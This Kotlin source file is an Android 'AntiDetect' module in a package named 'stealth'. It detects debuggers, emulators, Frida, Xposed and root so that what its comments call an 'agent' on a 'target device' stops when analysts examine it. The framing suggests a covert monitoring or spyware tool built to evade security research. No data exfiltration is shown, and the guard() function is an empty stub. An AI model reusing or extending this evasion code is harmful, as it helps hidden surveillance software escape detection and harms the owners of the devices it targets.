package com.sp.core.stealth

import android.content.Context
import android.os.Build
import java.io.File

object AntiDetect {

    /**
     * Only a real analysis environment stops the agent: a debuggable build, an
     * emulator or an attached debugger. Root/Magisk/Xposed are informational
     * only - on the target device they are normal and must not silently
     * disable the watchdog (that looked like a dead app).
     */
    fun isCompromised(ctx: Context): Boolean =
        isDebuggable(ctx) || isEmulator() || hasFrida() || hasXposed()

    /** Root / Magisk present - informational, stops nothing. */
    fun isRooted(): Boolean = hasMagisk() || hasRoot()

    private fun isDebuggable(ctx: Context): Boolean =
        (ctx.applicationInfo.flags and
            android.content.pm.ApplicationInfo.FLAG_DEBUGGABLE) != 0

    private fun isEmulator(): Boolean =
        Build.FINGERPRINT.startsWith("generic") ||
        Build.FINGERPRINT.contains("vbox") ||
        Build.FINGERPRINT.contains("emulator") ||
        Build.MODEL.contains("google_sdk") ||
        Build.MODEL.contains("Emulator") ||
        Build.HARDWARE.contains("goldfish") ||
        Build.HARDWARE.contains("ranchu")

    private fun hasFrida(): Boolean {
        val paths = listOf(
            "/data/local/tmp/frida-server",
            "/data/local/tmp/re.frida.server",
            "/system/lib/libfrida-gadget.so",
            "/system/lib64/libfrida-gadget.so"
        )
        if (paths.any { File(it).exists() }) return true
        // Short timeout: a plain connect() can block the main looper for
        // seconds (and that is an ANR, i.e. a "crash" without a stack trace).
        return try {
            val socket = java.net.Socket()
            socket.connect(java.net.InetSocketAddress("127.0.0.1", 27042), 300)
            socket.close()
            true
        } catch (_: Exception) { false }
    }

    private fun hasXposed(): Boolean = try {
        Class.forName("de.robv.android.xposed.XposedBridge"); true
    } catch (_: Throwable) { false }

    private fun hasMagisk(): Boolean = listOf(
        "/sbin/.magisk", "/sbin/magisk", "/data/adb/magisk",
        "/data/adb/modules", "/cache/magisk.log"
    ).any { File(it).exists() }

    private fun hasRoot(): Boolean = listOf(
        "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su",
        "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su",
        "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su",
        "/su/bin/su"
    ).any { File(it).exists() }

    fun guard(ctx: Context) {
        if (isCompromised(ctx)) return
    }
}